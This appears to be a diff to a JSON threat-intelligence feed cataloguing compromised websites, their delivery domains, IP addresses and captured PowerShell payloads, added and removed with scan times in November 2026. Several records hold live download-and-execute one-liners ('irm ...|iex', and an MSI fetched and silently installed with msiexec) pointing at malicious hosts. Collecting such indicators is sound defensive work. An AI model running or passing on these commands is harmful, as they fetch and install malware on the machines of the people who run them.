@@ -1,5 +1,69 @@
 [
   {
+    "UrlDomain": "www.mediweld.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.106.52"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/5f16a861fec93d5c",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29910323",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/5f16a861fec93d5c'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/5f16a861fec93d5c"
+    ],
+    "ReportId": "cmwfq2sdt0iq70omlfqlpffxx",
+    "ScannedAt": "2026-11-14T01:23:57.427000+00:00"
+  },
+  {
+    "UrlDomain": "kirketerpthaarup.dk",
+    "DeliveryUrl": [
+      "softsyncizobrazie.net"
+    ],
+    "PayloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "IP": [
+      "46.30.213.96"
+    ],
+    "Related": [],
+    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
+    "ResolvedDownloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "ReportId": "cmwfpywm20ikw0omloshmzs1c",
+    "ScannedAt": "2026-11-14T01:20:56.286000+00:00"
+  },
+  {
+    "UrlDomain": "20wawo30.com",
+    "DeliveryUrl": [
+      "github.pw"
+    ],
+    "PayloadUrl": [
+      "https://github.pw/Girya/1a887bc54c6d3982"
+    ],
+    "IP": [
+      "153.127.54.82"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://github[.]pw/Girya/1a887bc54c6d3982')|iex",
+    "ResolvedDownloadUrl": [
+      "https://github.pw/Girya/1a887bc54c6d3982"
+    ],
+    "ReportId": "cmwfpwgss0ihy0omlygayvwid",
+    "ScannedAt": "2026-11-14T01:19:02.441000+00:00"
+  },
+  {
     "UrlDomain": "update.sportela.bg",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -8487,22 +8551,5 @@
     ],
     "ReportId": "cmwa78v3607w70omluib5p702",
     "ScannedAt": "2026-11-10T04:37:57.278000+00:00"
-  },
-  {
-    "UrlDomain": "grozco.com",
-    "DeliveryUrl": [
-      "fastly.jsdelivr.net"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "195.211.47.67"
-    ],
-    "Related": [],
-    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
-    "ResolvedDownloadUrl": [
-      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
-    ],
-    "ReportId": "cmw9zizln07hd0oml2za1wlqb",
-    "ScannedAt": "2026-11-10T01:01:52.755000+00:00"
   }
 ]
